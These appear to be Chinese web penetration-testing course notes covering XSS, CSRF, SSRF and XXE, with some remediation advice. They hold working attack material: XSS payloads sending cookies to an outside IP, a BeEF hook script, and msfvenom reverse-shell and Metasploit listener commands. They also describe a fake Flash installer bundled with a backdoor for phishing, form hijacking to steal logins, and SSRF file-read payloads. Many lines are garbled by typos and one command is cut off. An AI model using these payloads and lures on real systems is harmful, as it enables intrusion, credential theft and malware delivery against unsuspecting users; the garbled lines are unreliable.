<h4 id="文件上传："><a href="#文件上传：" class="headerlink" title="#文件上传："></a>#文件上传：</h4><p>黑盒：寻找一切存在文件上传的功彰应用<br>1、个人用户中心是否存在文件上传功能<br>2、后台管理系统是佛存在文件上传功能<br>3、字典目录扫描探针文件上传构造地址<br>4、字典目录扫描探针编辑器目录构造地址<br>白盒：看三点，中间件，编辑器，功能代码<br>1、中间件直接看语言环境常见搭配<br>2、编辑器直接看目录机构或搜索关键字<br>3、功能代码直接看源码应用或搜索关键字</p>
<h1 id="第35天-WEB攻防-通用漏洞-XSS跨站-反射-存储-DOM-盲打-劫持"><a href="#第35天-WEB攻防-通用漏洞-XSS跨站-反射-存储-DOM-盲打-劫持" class="headerlink" title="第35天 WEB攻防-通用漏洞&amp;XSS跨站&amp;反射&amp;存储&amp;DOM&amp;盲打&amp;劫持"></a>第35天 WEB攻防-通用漏洞&amp;XSS跨站&amp;反射&amp;存储&amp;DOM&amp;盲打&amp;劫持</h1><h4 id="知识点：-18"><a href="#知识点：-18" class="headerlink" title="知识点："></a>知识点：</h4><p>1、XSS跨站-原理&amp;攻击&amp;分类等<br>2、XSS跨站-反射型&amp;存储型&amp;DOM型等<br>3、XSS跨站攻击手法&amp;劫持&amp;恣取凭据等<br>4、XSS跨站-攻击项目&amp;XSS平台&amp;Beef-XSS</p>
<p>1、原理<br>指改击者利用网程序对用户输入过不足，端入可以量示在页面上对其他用尸道成影响的HTML代码，从而盗取用户资料、利用用户具份进行某种动或者对访问者进行病毒侵害的一种攻击方式，通过在用户端注入恶意的可执行脚本，若服务器时用户的第人不进行处理或处理不严，则浏览器就会夏接执行用户注入的脚本。<br>产生的地点：<br>数据文互的地方<br>get.post.headers<br>反馈与浏览<br>富文本编辑器<br>各类标签插入和自定义<br>数据输出的地方<br>用户资料<br>关键词、标签、说明<br>文件上传</p>
<p>2、分类<br>反射型（非持久型）<br>存储型（特久型）<br>DOM型<br>mXSS(突变型XSS)<br>UXSS(通用型XSs)<br>Flash XSS<br>UTF-7 XSS<br>MHTML XSS<br>CSS XSS<br>VBScript XSS</p>
<p>3、危害<br>网络钓鱼，包括获取各类用户账号：<br>窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份对网站执行操作；<br>劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、发表日志、邮件等；<br>强制弹出广告页面、刷流量等：<br>网页挂马；<br>进行恶意操作，如任意算改页面信息、别除文章等；<br>进行大量的客户端攻击，如ddos等；<br>获取客户端信息，如用户的浏览历史、真实即、开放端口等；<br>控制受害者机器向其他网站发起攻击；<br>结合其他漏洞，如cS什，实施进一步危害；<br>提升用户权限，包括进一步渗透网站；<br>传懂跨站却本螺虫等</p>
<h4 id="XSS跨站系列内容："><a href="#XSS跨站系列内容：" class="headerlink" title="#XSS跨站系列内容："></a>#XSS跨站系列内容：</h4><p>1加粗样式、XSS跨站-原理8分类8手法<br>2、XSS站-探针&amp;利用&amp;审计<br>3、XSS聘站-另类攻击手法利用<br>4、XSS跨站-防御修复8饶过策暗</p>
<h4 id="演示案例：-13"><a href="#演示案例：-13" class="headerlink" title="演示案例："></a>演示案例：</h4><p>XSS跨站-原理&amp;分类&amp;手法&amp;探针<br>反射型实例-UA查询平台数据输出<br>思路：网站存在读取请求包中UA头并显示的功能–抓包修改UA头添加xss语句–xss语句执行<br>存储型实例-订单系统CMS权限获取<br>思路：留言板处会将输入保存到数据库中，后台管理员查看时会执行xss语句。此处xss语句可以替换为盗取cookie的语句，管理员执行后将管理员账号cookie发送到xss平台，从而盗取cookie。<br>DOM型实例-EmpireCMS前端页面审计<br>javascript:alter(1)这里不是传参，因此要改变写法<br>XSS利用环境-XSS平台&amp;Beef-XSS项目      —Beef很有用，直接要是受害者访问你的网站，即可去执行相关有害事件。<br>搭建beef-xss平台后，若受害者访问 <script src="http://192.168.1.105:3000/hook.js"></script> 则会被劫持浏览器，可以获取受害者cookie、跳转网站、钓鱼等。<br>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53517370/article/details/128992559">https://blog.csdn.net/qq_53517370/article/details/128992559</a>    –很不错，讲了很多beef的使用方法</p>
<h1 id="第36天-WEB攻防-通用漏洞-XSS跨站-MXSS-UXSS-FlashXSS-PDFXSS"><a href="#第36天-WEB攻防-通用漏洞-XSS跨站-MXSS-UXSS-FlashXSS-PDFXSS" class="headerlink" title="第36天 WEB攻防-通用漏洞&amp;XSS跨站&amp;MXSS&amp;UXSS&amp;FlashXSS&amp;PDFXSS"></a>第36天 WEB攻防-通用漏洞&amp;XSS跨站&amp;MXSS&amp;UXSS&amp;FlashXSS&amp;PDFXSS</h1><h4 id="知识点：-19"><a href="#知识点：-19" class="headerlink" title="知识点："></a>知识点：</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_60571842/article/details/132763262">https://blog.csdn.net/m0_60571842/article/details/132763262</a>      —对全部xss进行更详细的讲解</p>
<p>mXSS(突变型XSS)<br>UXSS(通用型XSs)<br>Flash XSS<br>UTF-7 XSS<br>MHTML XSS<br>CSS XSS<br>VBScript XSS</p>
<h4 id="演示案例：-14"><a href="#演示案例：-14" class="headerlink" title="演示案例："></a>演示案例：</h4><p>UXSS-Edge&amp;CVE-2021-34506<br>FlashXSS-PHPWind.&amp;SWF反编译<br>PDFXSS-PDF动作添加&amp;文件上传</p>
<h4 id="MXSS-https-www-fooying-com-the-art-of-xss-1-introduction"><a href="#MXSS-https-www-fooying-com-the-art-of-xss-1-introduction" class="headerlink" title="#MXSS:https://www.fooying.com/the-art-of-xss-1-introduction/"></a>#MXSS:<a target="_blank" rel="noopener" href="https://www.fooying.com/the-art-of-xss-1-introduction/">https://www.fooying.com/the-art-of-xss-1-introduction/</a></h4><h4 id="UXsS全称Jniversal-Cross-Site-Scripting"><a href="#UXsS全称Jniversal-Cross-Site-Scripting" class="headerlink" title="#UXsS全称Jniversal Cross-.Site Scripting"></a>#UXsS全称Jniversal Cross-.Site Scripting</h4><p>UXSS是利用浏览器或者浏览器扩展漏洞来制造产生XSS并执行代码的一种攻击类型。<br>MICROSOFT EDGE UXSS CVE-2021-34506<br>Edge浏览器翻译功能导致JS语句被调用执行<br><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1fX4y1c7rX">https://www.bilibili.com/video/BV1fX4y1c7rX</a></p>
<h4 id="Flashxss-swf引用js的xss"><a href="#Flashxss-swf引用js的xss" class="headerlink" title="#Flashxss-swf引用js的xss"></a>#Flashxss-swf引用js的xss</h4><p>JPEXS Free Flash Decompiler<br>phpwind SWF反编译Flashxss<br>Externallnterface.call执行JS代码<br>Payload:&#x2F;res&#x2F;js&#x2F;dev&#x2F;util_libs&#x2F;jPlayer&#x2F;Jplayer.swf?jQuery&#x3D;alert(1)))catch(e)0&#x2F;&#x2F;<br>思路：类似反射型XSS，通过对wsf文件进行反编译找出传参点，构造闭合传参使得xss语句执行</p>
<h4 id="PDFXSS-上传后直链发"><a href="#PDFXSS-上传后直链发" class="headerlink" title="#PDFXSS-上传后直链发"></a>#PDFXSS-上传后直链发</h4><p>1、创建PDF,加入动作JS<br>2、通过文件上传获取直链<br>3、直链地址访问后被缺发<br>危害：恶意pdf上传，受害者点击文件分享链接可被XSS平台和beefxss平台利用</p>
<h1 id="第37天-WEB攻防-通用漏洞-XSS跨站-权限维持-钓鱼捆绑-浏览器漏洞"><a href="#第37天-WEB攻防-通用漏洞-XSS跨站-权限维持-钓鱼捆绑-浏览器漏洞" class="headerlink" title="第37天 WEB攻防-通用漏洞&amp;XSS跨站&amp;权限维持&amp;钓鱼捆绑&amp;浏览器漏洞"></a>第37天 WEB攻防-通用漏洞&amp;XSS跨站&amp;权限维持&amp;钓鱼捆绑&amp;浏览器漏洞</h1><h4 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h4><p>XSS跨站-另类攻击手法利用</p>
<h4 id="演示案例：-15"><a href="#演示案例：-15" class="headerlink" title="演示案例："></a>演示案例：</h4><p>XSS-后台植入Cookie&amp;表单劫持<br>XSS-Flash钓鱼配合MSF捆绑上线<br>XSS-浏览器网马配合MSF访问上线</p>
<h4 id="XSS-后台植入Cookie-表单劫持"><a href="#XSS-后台植入Cookie-表单劫持" class="headerlink" title="#XSS-后台植入Cookie&amp;表单劫持"></a>#XSS-后台植入Cookie&amp;表单劫持</h4><p>条件：已取得相关web权限后         —就比如将危险xss代码放在博客的主页，就可以去利用beef去获取访问者的信息<br>1、写入代码到登录成功文件，利用beef或xss平台实时监控Cookie等凭据实现权限维持<br>（思路：将xss语句写入登录成功的默认文件，用户登录成功后会直接将信息发送到xss平台）<br>2、若存在同源策路或防护情况下，Cookie获取失败可采用表单劫持或数据明文传输实现<br>（思路：将xss语句写入验证密码的文件，设置变量接收用户名和密码通过xss语句送到到VPS接收数据）</p>
<h4 id="XSS-Flash钓鱼配合MSF捆绑上线"><a href="#XSS-Flash钓鱼配合MSF捆绑上线" class="headerlink" title="#XSS-Flash钓鱼配合MSF捆绑上线"></a>#XSS-Flash钓鱼配合MSF捆绑上线</h4><p>条件：beef上线受控后或直接钓鱼(受害者爱看SESE)                  ——–<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43225966/article/details/130291934">https://blog.csdn.net/weixin_43225966/article/details/130291934</a><br>1、生成后门<br>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;xx.xx.xx.xx LPORT&#x3D;6666-f exe<br>flash exe<br>2、下载官方文件保证安装正常<br>3、压缩捆绑文件-解压提取运行<br>4、MSF配置监听状态<br>use exploit&#x2F;multi&#x2F;handler<br>set payload windows&#x2F;meterpreter&#x2F;reverse tcp<br>set Ihost 0.0.0.0<br>set Iport 6666<br>run<br>5、诱使受害者访问URL-语言要适当<br>前期准备：后门文件准备：msf生成后门.exe文件，通过压缩将后门文件和flash安装文件放一起，压缩时选择解压前运行.exe文件，可对后门文件做免杀<br>诱使受害者访问构造好的flash页面–点击下载出插入xss语句–执行后门文件下载–压缩时运行 –上线</p>
<h4 id="XSS-浏览器网马配合MSF访问上线"><a href="#XSS-浏览器网马配合MSF访问上线" class="headerlink" title="#XSS-浏览器网马配合MSF访问上线"></a>#XSS-浏览器网马配合MSF访问上线</h4><p>条件：beef上线受控后或直接钓鱼(浏览器存在0day)<br>1、配置MSF生成URL<br>use exploit&#x2F;windows&#x2F;browser&#x2F;ms14_064_ole_code_execution<br>set allowpowershellprompt true<br>set target 1<br>run<br>2、诱使受害者访问URL-语言要适当<br>思路：诱使受害者访问含有beefxss 语句的网站页面–beefxss平台执行网站跳转–跳转到含有payload的网站–上线   </p>
<h1 id="第38天-WEB攻防-通用漏洞-XSS跨站-绕过修复-http-only-CSP-标签符号"><a href="#第38天-WEB攻防-通用漏洞-XSS跨站-绕过修复-http-only-CSP-标签符号" class="headerlink" title="第38天 WEB攻防-通用漏洞&amp;XSS跨站&amp;绕过修复&amp;http-only&amp;CSP&amp;标签符号"></a>第38天 WEB攻防-通用漏洞&amp;XSS跨站&amp;绕过修复&amp;http-only&amp;CSP&amp;标签符号</h1><h4 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h4><p>4、修复<br>1、过滤一些危险字符<br>2、HTTP-only Cookie<br>3、设置CSP(Content Security Policy)<br>4、输入内容长度限制，转义等</p>
<h4 id="演示案例：-16"><a href="#演示案例：-16" class="headerlink" title="演示案例："></a>演示案例：</h4><p>XSS绕过-CTFSHOW-361到331关卡绕过WP<br>XSS修复-过滤涵数&amp;http_only&amp;CSP&amp;长度限制</p>
<p>绕过：https:z.aliyun.com&#x2F;t&#x2F;4067</p>
<p>ctfshow刷题记录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">316-反射型直接远程调用</span><br><span class="line">前置知识：document.cookie是用来直接获取cookie的，window.location.href是获取跳转地址的</span><br><span class="line">&lt;script&gt;window.location.href=&#x27;http://47.94.236.117/get.php?c=&#x27;+document.cookie&lt;/script&gt;</span><br><span class="line">317-反射型-过滤&lt;script&gt;</span><br><span class="line">&lt;img src=1onerror=window.location.href=&#x27;http://47.94.236.117/getphp?c=&#x27;+document cookie,&gt;</span><br><span class="line">318  319-反射型-过滤&lt;img&gt;</span><br><span class="line">&lt;inputonload=&quot;window.location.href=&#x27;http://47.94.236.117/get.php?c=&#x27;+document.cookie:&quot;&gt;</span><br><span class="line">&lt;svgonload=&quot;window.location.href=&#x27;http://47.94.236.117/getphp?c=&#x27;+document cookie;&quot;&gt;</span><br><span class="line">320-326-反射型过滤空格</span><br><span class="line">&lt;svg/onload=&quot;window.location.href=&#x27;http://47.94.236.117/get.php?c=&#x27;+document cookie;&quot;</span><br><span class="line">327存储型无过滤</span><br><span class="line">&lt;script&gt;window.location href=&#x27;http://47.94.236.117/get.php?c=&#x27;+document cookie&lt;/script&gt;</span><br><span class="line">328存储型注册插入JS</span><br><span class="line">&lt;script&gt;window.location.href=&#x27;http://47.94.236.117/get.php?c=&#x27;+document cookie&lt;/script&gt;</span><br><span class="line">思路：在密码处插入xss语句--获取cookie--抓包替换cookie--管理员权限获取flag（用户名处会过滤某些关键字 手动狗头）</span><br><span class="line">329 存储型 失效凭据需1步完成所需操作</span><br><span class="line">思路：利用js语句直接读取管理员页面中标签中的flag然后通过xss语句发送到vps</span><br><span class="line">&lt;script&gt;</span><br><span class="line">$(&#x27;.laytable-cell-1-0-1&#x27;).each(function(index,value)&#123;if(value.innerText.indexOf(&#x27;ctfshow&#123;&#x27;)&gt;-1)&#123;location.href=&#x27;http://ip/x.php?cookie=&#x27;+value.innerText&#125;&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">330-存储型-借助修改密码重置管理员密码(GET)  类似于crsf，通过xss代码注册，使得管理员执行修改密码的语句，攻击者获得密码后即可</span><br><span class="line">&lt;script&gt;window.location.href=&#x27;http://127.0.0.1/api/change.php?p=123&#x27;;&lt;/script&gt;</span><br><span class="line">331-存储型借助修改密码重置管理员密码P0ST)</span><br><span class="line">&lt;script&gt;$.ajax(&#123;url &#x27;http://127.0.0.1/api/change.php&#x27;type&#x27;post&#x27;.data &#123;p&#x27;123&#x27;&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="XSS修复-过滤函数-http-only-CSP-长度限制"><a href="#XSS修复-过滤函数-http-only-CSP-长度限制" class="headerlink" title="#XSS修复-过滤函数&amp;http_only&amp;CSP&amp;长度限制"></a>#XSS修复-过滤函数&amp;http_only&amp;CSP&amp;长度限制</h4><p>1、过滤一些危险字符，以及转义&amp; &lt;&gt; “ ·等危险字符<br>自定义过滤函数引用<br>2、HTTP-only Cookie<br><a target="_blank" rel="noopener" href="https://www.php.cn/php-ask-457831.html">https://www.php.cn/php-ask-457831.html</a><br>php.in 设置或代码引用<br>session.cookie httponly &#x3D;1<br>ini set(“session.cookie httponly”,1);</p>
<p>http-only的设置能够去防止cookie被<strong>完全</strong>的盗取，使js脚本无法获取完整全部的cookie</p>
<p>相关文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38553333/article/details/80055521">https://blog.csdn.net/qq_38553333/article/details/80055521</a></p>
<p>3、设置CSP(Content Security Policy) 防止资源外发 防止网页加载恶意脚本和其他危险资源<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/a1766855068/article/details/89370320">https://blog.csdn.net/a1766855068/article/details/89370320</a><br>header(“Content-Security-Policy:img-src ‘self “)<br>4、输入内容长度限制，实体转义等</p>
<h1 id="第40天-WEB攻防-通用漏洞-CSRF-SSRF-协议玩法-内网探针-漏洞利用"><a href="#第40天-WEB攻防-通用漏洞-CSRF-SSRF-协议玩法-内网探针-漏洞利用" class="headerlink" title="第40天 WEB攻防-通用漏洞&amp;CSRF&amp;SSRF&amp;协议玩法&amp;内网探针&amp;漏洞利用"></a>第40天 WEB攻防-通用漏洞&amp;CSRF&amp;SSRF&amp;协议玩法&amp;内网探针&amp;漏洞利用</h1><h4 id="知识点：-20"><a href="#知识点：-20" class="headerlink" title="知识点："></a>知识点：</h4><p>1、CSRF-原理&amp;危害&amp;探针&amp;利用等<br>2、SSRF-原理&amp;危害&amp;探针&amp;利用等<br>3、CSRF&amp;SSRF-黑盒下漏洞探针点</p>
<h4 id="详细点：-7"><a href="#详细点：-7" class="headerlink" title="#详细点："></a>#详细点：</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43378996/article/details/123910614">https://blog.csdn.net/qq_43378996/article/details/123910614</a>         ——CSRF详解</p>
<p>CSRF全称：Cross-site request forgery,即，跨站请求伪造，也被称为“One Click Attack”或“Session Riding”，通常缩写为CSRF或者XSRF,，是一种对网站的恶意利用。举个生活中的例子：就是某个人点了个奇怪的链接，自己什么也没输，但自己的qg号或其他的号就被盗了。即该攻击可以在受害者不知情的情况下以受害者名义伪造请求，执行恶意操作，具有很大的危害性。<br>CSRF的攻击过程两个条件：<br>1、目标用户已经登录了网站，能够执行网站的功能。<br>2、目标用户访问了攻击者构造的URL,<br>CSRF安全问题黑盒怎么判断：<br>1、看验证来源不-修复<br>2、看凭据有无token-修复<br>3、看关键操作有无验证-修复<br>-CSRF安全问题白盒怎么审计：<br>同黑盒思路一样，代码中分析上述三看</p>
<p>SSRF(Server-Side Request Forgery:服务器端请求伪造)是一种由攻击者构造形成由服务端发起请求的一个安全漏同。一股情况下，SS凡F攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔高的内部系统）SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片 地址等<br>SSRF黑盒可能出现的地方：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.社交分享功能：获取超链接的标题等内容进行显示</span><br><span class="line">2.转码服务：通过UL地址把原地址的网页内容调优使其适合手机屏幕浏览</span><br><span class="line">3.在线到译：给网止到译对应网页的内容</span><br><span class="line">4图片加载下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</span><br><span class="line">5.图片文章收载功能：主要其会取URL地址中titl以及文本的内容作为显示以求一个好的用具体验</span><br><span class="line">6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</span><br><span class="line">7.网站采集，网站抓取的地方：一些网站会针对你输入的u进行一些信悬采集工作</span><br><span class="line">8.数后库内置功能：数据库的比如mongodb的copyDatabase函致</span><br><span class="line">9.邮件系统：比如接收邮件服务器地址</span><br><span class="line">10.编码处理，属性信息处理，文件处理：比如fpmg,ImageMagick,docX,pdf,Xml收处理器等</span><br><span class="line">11.未公开的pi实现以及其他扩展调用URL的功能：可以利用g0ogle语法动加上这些关键字去寻找SSRF漏洞一些的url中的关键字：share、wap、url、ink、src、source、target、.u、3g、display、sourceURI、imageURL、domain.-.-</span><br><span class="line">12.从远程服务器请求资源（upload from url如discuz!;mpot&amp;expost rss feed如webblog;使用了xmi写引擎对象的地方如vordpress xmlrpc.php)</span><br></pre></td></tr></table></figure>

<p>可能利用的伪协议：            ———-特别是在ctf赛题中，经常会出现这个。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file:/// 从文件系统中获取文件内容，如，file:///etc/passwd</span><br><span class="line">dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：</span><br><span class="line">sftp:// SSH文件传输协议或安全文件传输协议</span><br><span class="line">ldap:// 轻量级目录访问协议</span><br><span class="line">tftp:// 简单文件传输协议</span><br><span class="line">gopher:// 分布式文档传递服务，可使用gopherus生成payload</span><br></pre></td></tr></table></figure>

<p>-SSRF白盒可能出现的地方：</p>
<p>1、功能点抓包指向代码块审计</p>
<p>2、功能点函数定位代码块审计</p>
<p>-SSRF常见安全修复防御方案：<br>1、禁用跳转</p>
<p>2、禁用不需要的协议</p>
<p>3、固定或限制资源地址</p>
<p>4、错误信息统一信息处理</p>
<p><img src="https://img-blog.csdnimg.cn/direct/607f655f46a045e68d3aa0053dfd2857.png" alt="在这里插入图片描述"></p>
<h4 id="系列内容点："><a href="#系列内容点：" class="headerlink" title="#系列内容点："></a>#系列内容点：</h4><p>1、CSRF&amp;SSRF&amp;原理&amp;利用&amp;协议等<br>2、CSRF&amp;SSRF&amp;黑盒&amp;审计&amp;修复等</p>
<p>演示案例：<br>CSRF-原理&amp;后台自动添加管理员<br>SSRF-原理&amp;服务&amp;协议&amp;内网&amp;漏洞<br>SSRF-某实际案例测试演示（功能点）</p>
<h4 id="CSRF-原理-后台自动添加管理员"><a href="#CSRF-原理-后台自动添加管理员" class="headerlink" title="#CSRF-原理&amp;后台自动添加管理员"></a>#CSRF-原理&amp;后台自动添加管理员</h4><p>案例说明：小迪在登录后台管理自己网站的时候，突然群里给小迪说阿祖又说爱上别人了，随后给我发了个URL链接，小迪直接点了进去，GG!<br>小迪的网站：htp:&#x2F;test.xiaodi8.com&#x2F;<br>发送的URL:htp:∥47.94.236.117&#x2F;add.html<br>利用流程：<br>1、获取目标的触发数据包<br>2、利用CSRFTestert构造导出<br>3、诱使受害者访问特定地址触发<br>上面的那个add.html就是增加管理员命令的那个数据包，至于这个URL的构造我们可以利用CSRFTester这个工具来构造，具体的流程就是首先通过前期的信息收集得知这个网站是由什么系统搭建的，那么我们就可以在本地搭建个一样的，然后打开这个工具，首先点击start，并且浏览器也要设置代理为本地的8008端口，然后在浏览器执行添加管理员的操作，抓到包之后就用from形式，然后点击右下角保存就是我们需要的地址，然后还要对这个数据包进行修改，只保留那个request2的，其他的全部删掉。<br>CSRF攻击需要满足三个条件：网站在管理员登录状态(或则不是网站的话其他的也得是登陆状态)，然后能构造数据包，并且构造的地址对方会点击。三个条件缺一不可。<br>通俗的解释CSRF:</p>
<p>“攻击者盗用了你的身份，以你的名义发送恶意请求”，CSRF是一种依赖web浏览器的、被混淆过的代理人攻击，往往涉及到个人隐私泄露以及财产安全。</p>
<p>csrf黑盒首先看有无token，第二点看能够触发的数据包的地址是不是管理员直接访问就可以直接触发成功，有没有验证过程，有的话能不能绕过，不能绕过就gg，第三个看同源策略，这个可以通过抓包去修改refer的值.</p>
<h4 id="SSRF-原理-服务-协议-内网-漏洞"><a href="#SSRF-原理-服务-协议-内网-漏洞" class="headerlink" title="#SSRF-原理&amp;服务&amp;协议&amp;内网&amp;漏洞"></a>#SSRF-原理&amp;服务&amp;协议&amp;内网&amp;漏洞</h4><p>-参考文章：https:w.t00ls.cc&#x2F;articles-41070.html<br>案例说明：小迪在本地创建了远程图片文件加载应用，直接被攻击者利用SSF探针本地<br>及内网服务，并利用某漏洞直接获取到内网某主机的权限！<br>1、服务探针：<br><a target="_blank" rel="noopener" href="http://127.0.0.1:8081/">http://127.0.0.1:8081/</a><br>htp:&#x2F;&#x2F;127.0.0.1:3306&#x2F;<br>2、协议玩法：（更多玩法见上图）<br>file:&#x2F;&#x2F;&#x2F;D:&#x2F;<a target="_blank" rel="noopener" href="http://www.txt/">www.txt</a><br>dict:&#x2F;&#x2F;127.0.0.1:3306&#x2F;info<br><a href="ftp://192.168.46.148/">ftp://192.168.46.148:21</a><br>3、内风扫描：<br><a target="_blank" rel="noopener" href="http://192.168.46.148:8080/">http://192.168.46.148:8080</a><br>4、漏洞利用：<br>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_http LHOST&#x3D;47.94.236.117<br>LPORT&#x3D;6688-f exe-o xx.exe<br>-监听：<br>use exploit&#x2F;multi&#x2F;handler<br>set payload windows&#x2F;meterpreter&#x2F;reverse_http<br>set Ihost 0.0.0.0<br>set Iport 6688<br>run<br>-下载：<a target="_blank" rel="noopener" href="http://192.168.46.148:8080/?search==%00">http://192.168.46.148:8080/?search==%00</a>(.execlcmd.exe%20&#x2F;c%20certutil%20-</p>
<h1 id="第40天-WEB攻防-通用漏洞-CSRF-SSRF-代码审计-同源策略-加载函数"><a href="#第40天-WEB攻防-通用漏洞-CSRF-SSRF-代码审计-同源策略-加载函数" class="headerlink" title="第40天 WEB攻防-通用漏洞&amp;CSRF&amp;SSRF&amp;代码审计&amp;同源策略&amp;加载函数"></a>第40天 WEB攻防-通用漏洞&amp;CSRF&amp;SSRF&amp;代码审计&amp;同源策略&amp;加载函数</h1><h4 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h4><p>同上节</p>
<h4 id="演示案例：-17"><a href="#演示案例：-17" class="headerlink" title="演示案例："></a>演示案例：</h4><p>代码审计-CSRF.SCMSFH无验证</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">思路：添加用户出抓包–使用CSRF抓包工具构造添加指定管理员账户的html文件并将文件上传到vps–受害者在网站保持登录状态下访问构造好的vps文件链接–触发csrf语句添加指定管理员账户</span><br><span class="line">代码审计：找到添加管理员add处代码–发现除了添加账户名的规则外无其他过滤–存在csrf漏洞</span><br></pre></td></tr></table></figure>
</blockquote>
<p><strong>代码审计-CSRF-ZBLOG同源策略</strong></p>
<blockquote>
<p>思路：同上不走测试csrf漏洞，发现语句执行返回错误，代理审计发现添加管理员出含有referer监测–<br>两种绕过思路<br>1、伪造-需要在代码数据包文件固定来源 2、尝试在网站寻找可上传地方，上传数据包文件，取得当前同域名访问地址</p>
</blockquote>
<p><strong>代码审计-SSRF.Yzmcms功能&amp;函数</strong></p>
<blockquote>
<p>思路：采集功能处写入文件读取代码–读取到服务器下文件</p>
</blockquote>
<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF:"></a>SSRF:</h4><p>1、特定漏洞功能-&gt;代码段分析审计<br>2、特定漏洞函数-&gt;测试对应功能判断<br>功能点-采集审计<br>采集添加-测试-抓包-代码-远程请求资源操作（函数）<br>函数-功能审计<br>file_get_contents</p>
<h4 id="特性挖掘审计"><a href="#特性挖掘审计" class="headerlink" title="特性挖掘审计"></a>特性挖掘审计</h4><p>1.直接复现有没有<br>成功-&gt;有漏洞<br>失败-&gt;代码-&gt;缺陷过滤（绕过）-&gt;有漏洞<br>失败-&gt;代码-&gt;完整过滤-&gt;没有漏洞<br>来源检测：<br>1、伪造-需要在代码数据包文件固定来源<br>2、尝试在网站寻找可上传地方，上传数据包文件，取得当前同域名访问地址</p>
<h4 id="其他漏洞："><a href="#其他漏洞：" class="headerlink" title="其他漏洞："></a>其他漏洞：</h4><p>关键函数和应用功能</p>
<h1 id="第41天-WEB攻防-通用漏洞-XML-XXE-无回显-DTD实体-伪协议-代码审计"><a href="#第41天-WEB攻防-通用漏洞-XML-XXE-无回显-DTD实体-伪协议-代码审计" class="headerlink" title="第41天 WEB攻防-通用漏洞&amp;XML&amp;XXE&amp;无回显&amp;DTD实体&amp;伪协议&amp;代码审计"></a>第41天 WEB攻防-通用漏洞&amp;XML&amp;XXE&amp;无回显&amp;DTD实体&amp;伪协议&amp;代码审计</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">说明：xxe这个知识点也是CTF赛题中的热门考点之一，是OWASP中的一部分，面试知识点什么的很容易问到的。</span><br></pre></td></tr></table></figure>

<h4 id="知识点：-21"><a href="#知识点：-21" class="headerlink" title="知识点："></a>知识点：</h4><p>1、XML&amp;XXE-原理&amp;发现&amp;利用&amp;修复等<br>2、ML&amp;XXE黑盒模式下的发现与利用<br>3、XML&amp;XXE-白盒模式下的审计与利用<br>4、XML&amp;XXE-无回显&amp;伪协议&amp;产生层面</p>
<h4 id="思路点："><a href="#思路点：" class="headerlink" title="#思路点："></a>#思路点：</h4><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a></p>
<p>-XXE黑盒发现：</p>
<blockquote>
<p>1、获取得到Content-Type或数据类型为xml时，尝试进行xml语言payload进行测试<br>2、不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试XXE<br>3、XXE不仅在数据传输上可能存在漏洞，同样在文件上传引用插件解析或预览也会造成文件中的XXE Payload被执行</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注：一般在CTF题目中都会比较刻意，就能够去直接发现找到xml的格式，甚至有些题还会直接给出xml文件。</span><br></pre></td></tr></table></figure>

<p><strong>-XXE白盒发现：</strong></p>
<blockquote>
<p>1、可通过应用功能追踪代码定位审计<br>2、可通过脚本特定函数搜索定位审计<br>3、可通过伪协议玩法绕过相关修复等</p>
</blockquote>
<p>详细点：</p>
<blockquote>
